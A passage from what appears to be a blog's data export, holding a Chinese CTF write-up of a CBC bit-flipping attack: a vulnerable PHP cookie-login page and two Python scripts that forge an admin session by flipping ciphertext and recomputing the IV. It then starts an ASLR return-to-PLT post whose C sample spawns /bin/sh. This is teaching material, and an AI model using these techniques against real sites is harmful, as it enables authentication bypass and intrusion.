class=\"string\">'username'</span>=&gt;$username,<span class=\"string\">'password'</span>=&gt;$password);</span><br><span class=\"line\">        login($info);</span><br><span class=\"line\">        show_homepage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">\"username\"</span>]))&#123;</span><br><span class=\"line\">        check_login();</span><br><span class=\"line\">        show_homepage();</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;body class=\"login-body\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;div id=\"wrapper\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;div class=\"user-icon\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;div class=\"pass-icon\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"header\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"content\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"footer\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;/body&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>首先确定解密后的字符串:</p>\n<blockquote>\n<p>a:2:{s:8:”username”;s:5:”zdmin”;s:8:”password”;s:5:”12345”}</p>\n</blockquote>\n<p>第一步: 替换cookie中的cipher为反转后的cipher.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Date    : 2018-03-15 11:45:57</span></span><br><span class=\"line\"><span class=\"comment\"># @Author  : Mr.zhang(s4ad0w.protonmail.com)</span></span><br><span class=\"line\"><span class=\"comment\"># @Link    : http://blog.csdn.net/csu_vc</span></span><br><span class=\"line\"><span class=\"comment\"># username='zdmin'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\">iv_raw=<span class=\"string\">'DbVDXiIkUNkqwCARqqpYew%3D%3D'</span>  <span class=\"comment\">#这里填写第一次返回的iv值</span></span><br><span class=\"line\">cipher_raw=<span class=\"string\">'27cekPxVgR5hbiu6ay%2BUfSmepzwYYL%2FTdbN1K3kmrH2EJ%2FqvBtAdKGGqGytHgJXJzNB26ZRX5dwupd885R%2Bwng%3D%3D'</span>  <span class=\"comment\">#这里填写第一次返回的cipher值</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"[*]原始iv和cipher\"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"iv_raw:  \"</span> + iv_raw</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"cipher_raw:  \"</span> + cipher_raw</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"[*]对cipher解码，进行反转\"</span></span><br><span class=\"line\">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class=\"line\"><span class=\"comment\">#a:2:&#123;s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#s:2:&#123;s:8:\"userna</span></span><br><span class=\"line\"><span class=\"comment\">#me\";s:5:\"zdmin\";</span></span><br><span class=\"line\"><span class=\"comment\">#s:8:\"password\";s</span></span><br><span class=\"line\"><span class=\"comment\">#:3:\"12345\";&#125;</span></span><br><span class=\"line\">xor_cipher = cipher[<span class=\"number\">0</span>:<span class=\"number\">9</span>] +  chr(ord(cipher[<span class=\"number\">9</span>]) ^ ord(<span class=\"string\">'z'</span>) ^ ord(<span class=\"string\">'a'</span>)) + cipher[<span class=\"number\">10</span>:]  <span class=\"comment\">#请根据你的输入自行更改，原理看上面的介绍</span></span><br><span class=\"line\">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"反转后的cipher：\"</span> + xor_cipher</span><br></pre></td></tr></table></figure>\n<p>第二步: 第一步执行完，得到一个base64之后的字符串，代入下边的脚本，然后替换cookie中的iv为以下脚本输出的新的iv值。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Date    : 2018-03-15 11:56:20</span></span><br><span class=\"line\"><span class=\"comment\"># @Author  : csu_vc(s4ad0w.protonmail.com)</span></span><br><span class=\"line\"><span class=\"comment\"># @Link    : http://blog.csdn.net/csu_vc</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\">cipher = <span class=\"string\">'t8hxonGnYZs19dVMEzqeZm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'</span><span class=\"comment\">#填写提交后所得的无法反序列化密文</span></span><br><span class=\"line\">iv = <span class=\"string\">'DbVDXiIkUNkqwCARqqpYew%3D%3D'</span><span class=\"comment\">#一开始提交的iv</span></span><br><span class=\"line\">cipher = urllib.unquote(cipher)</span><br><span class=\"line\">cipher = base64.b64decode(cipher)</span><br><span class=\"line\">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class=\"line\">newIv = <span class=\"string\">''</span></span><br><span class=\"line\">right = <span class=\"string\">'a:2:&#123;s:8:\"userna'</span><span class=\"comment\">#被损坏前正确的明文</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) <span class=\"comment\">#这一步相当于把原来iv中不匹配的部分修改过来</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"CBC翻转攻击\"><a href=\"#CBC翻转攻击\" class=\"headerlink\" title=\"CBC翻转攻击\"></a>CBC翻转攻击</h1><p>参考链接:</p>\n<ol>\n<li><a href=\"https://blog.csdn.net/csu_vc/article/details/79619309\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/csu_vc/article/details/79619309</a></li>\n<li><a href=\"http://wooyun.jozxing.cc/static/drops/tips-7828.html\" target=\"_blank\" rel=\"noopener\">http://wooyun.jozxing.cc/static/drops/tips-7828.html</a></li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html <span class=\"keyword\">PUBLIC</span> <span class=\"string\">\"-//W3C//DTD XHTML 1.0 Transitional//EN\"</span> <span class=\"string\">\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"</span>&gt;;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt;</span><br><span class=\"line\">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class=\"line\">&lt;link href=<span class=\"string\">\"static/css/style.css\"</span> rel=<span class=\"string\">\"stylesheet\"</span> type=<span class=\"string\">\"text/css\"</span> /&gt;</span><br><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span> src=<span class=\"string\">\"static/js/jquery.min.js\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">$(document).ready(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    $(<span class=\"string\">\".username\"</span>).focus(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">\".user-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"-48px\"</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    $(<span class=\"string\">\".username\"</span>).blur(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">\".user-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"0px\"</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    $(<span class=\"string\">\".password\"</span>).focus(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">\".pass-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"-48px\"</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    $(<span class=\"string\">\".password\"</span>).blur(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $(<span class=\"string\">\".pass-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"0px\"</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">define(<span class=\"string\">\"SECRET_KEY\"</span>, file_get_contents(<span class=\"string\">'/root/key'</span>));</span><br><span class=\"line\">define(<span class=\"string\">\"METHOD\"</span>, <span class=\"string\">\"aes-128-cbc\"</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_random_iv</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    $random_iv=<span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;<span class=\"number\">16</span>;$i++)&#123;</span><br><span class=\"line\">        $random_iv.=chr(rand(<span class=\"number\">1</span>,<span class=\"number\">255</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $random_iv;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($info)</span></span>&#123;</span><br><span class=\"line\">    $iv = get_random_iv();</span><br><span class=\"line\">    $plain = serialize($info);</span><br><span class=\"line\">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'username'</span>] = $info[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"iv\"</span>, base64_encode($iv));</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"cipher\"</span>, base64_encode($cipher));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_login</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'cipher'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'iv'</span>]))&#123;</span><br><span class=\"line\">        $cipher = base64_decode($_COOKIE[<span class=\"string\">'cipher'</span>]);</span><br><span class=\"line\">        $iv = base64_decode($_COOKIE[<span class=\"string\">\"iv\"</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class=\"line\">            $info = unserialize($plain) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;p&gt;base64_decode('\"</span>.base64_encode($plain).<span class=\"string\">\"') can't unserialize&lt;/p&gt;\"</span>);</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">'username'</span>] = $info[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"ERROR!\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_homepage</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">\"username\"</span>]===<span class=\"string\">'admin'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;hello '</span>.$_SESSION[<span class=\"string\">'username'</span>].<span class=\"string\">'&lt;/p&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>]))&#123;</span><br><span class=\"line\">    $username = (string)$_POST[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    $password = (string)$_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($username === <span class=\"string\">'admin'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $info = <span class=\"keyword\">array</span>(<span class=\"string\">'username'</span>=&gt;$username,<span class=\"string\">'password'</span>=&gt;$password);</span><br><span class=\"line\">        login($info);</span><br><span class=\"line\">        show_homepage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">\"username\"</span>]))&#123;</span><br><span class=\"line\">        check_login();</span><br><span class=\"line\">        show_homepage();</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;body class=\"login-body\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;div id=\"wrapper\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;div class=\"user-icon\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;div class=\"pass-icon\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"header\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"content\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"footer\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;/body&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>首先确定解密后的字符串:</p>\n<blockquote>\n<p>a:2:{s:8:”username”;s:5:”zdmin”;s:8:”password”;s:5:”12345”}</p>\n</blockquote>\n<p>第一步: 替换cookie中的cipher为反转后的cipher.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Date    : 2018-03-15 11:45:57</span></span><br><span class=\"line\"><span class=\"comment\"># @Author  : Mr.zhang(s4ad0w.protonmail.com)</span></span><br><span class=\"line\"><span class=\"comment\"># @Link    : http://blog.csdn.net/csu_vc</span></span><br><span class=\"line\"><span class=\"comment\"># username='zdmin'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\">iv_raw=<span class=\"string\">'DbVDXiIkUNkqwCARqqpYew%3D%3D'</span>  <span class=\"comment\">#这里填写第一次返回的iv值</span></span><br><span class=\"line\">cipher_raw=<span class=\"string\">'27cekPxVgR5hbiu6ay%2BUfSmepzwYYL%2FTdbN1K3kmrH2EJ%2FqvBtAdKGGqGytHgJXJzNB26ZRX5dwupd885R%2Bwng%3D%3D'</span>  <span class=\"comment\">#这里填写第一次返回的cipher值</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"[*]原始iv和cipher\"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"iv_raw:  \"</span> + iv_raw</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"cipher_raw:  \"</span> + cipher_raw</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"[*]对cipher解码，进行反转\"</span></span><br><span class=\"line\">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class=\"line\"><span class=\"comment\">#a:2:&#123;s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"&#125;</span></span><br><span class=\"line\"><span class=\"comment\">#s:2:&#123;s:8:\"userna</span></span><br><span class=\"line\"><span class=\"comment\">#me\";s:5:\"zdmin\";</span></span><br><span class=\"line\"><span class=\"comment\">#s:8:\"password\";s</span></span><br><span class=\"line\"><span class=\"comment\">#:3:\"12345\";&#125;</span></span><br><span class=\"line\">xor_cipher = cipher[<span class=\"number\">0</span>:<span class=\"number\">9</span>] +  chr(ord(cipher[<span class=\"number\">9</span>]) ^ ord(<span class=\"string\">'z'</span>) ^ ord(<span class=\"string\">'a'</span>)) + cipher[<span class=\"number\">10</span>:]  <span class=\"comment\">#请根据你的输入自行更改，原理看上面的介绍</span></span><br><span class=\"line\">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"反转后的cipher：\"</span> + xor_cipher</span><br></pre></td></tr></table></figure>\n<p>第二步: 第一步执行完，得到一个base64之后的字符串，代入下边的脚本，然后替换cookie中的iv为以下脚本输出的新的iv值。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Date    : 2018-03-15 11:56:20</span></span><br><span class=\"line\"><span class=\"comment\"># @Author  : csu_vc(s4ad0w.protonmail.com)</span></span><br><span class=\"line\"><span class=\"comment\"># @Link    : http://blog.csdn.net/csu_vc</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\">cipher = <span class=\"string\">'t8hxonGnYZs19dVMEzqeZm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'</span><span class=\"comment\">#填写提交后所得的无法反序列化密文</span></span><br><span class=\"line\">iv = <span class=\"string\">'DbVDXiIkUNkqwCARqqpYew%3D%3D'</span><span class=\"comment\">#一开始提交的iv</span></span><br><span class=\"line\">cipher = urllib.unquote(cipher)</span><br><span class=\"line\">cipher = base64.b64decode(cipher)</span><br><span class=\"line\">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class=\"line\">newIv = <span class=\"string\">''</span></span><br><span class=\"line\">right = <span class=\"string\">'a:2:&#123;s:8:\"userna'</span><span class=\"comment\">#被损坏前正确的明文</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) <span class=\"comment\">#这一步相当于把原来iv中不匹配的部分修改过来</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure>\n"},{"title":"bypassaslr_1","date":"2018-05-21T08:30:00.000Z","_content":"\n# 绕过ASLR--return2plt\n\n## 编译代码\n\n1. 源代码\n\n   ```c\n   #include<stdio.h>\n   #include <string.h>\n   /* Eventhough shell() function isnt invoked directly, its needed\n      here since 'system@PLT' and 'exit@PLT' stub code should be pres\n      ent in executable to successfully exploit it. */\n   void shell() {\n   \tsystem(\"/bin/sh\");\n   \texit(0);\n   }\n   int main(int argc, char* argv[]) {\n   \tint i=0;\n   \tchar buf[256];\n   \tread(0, 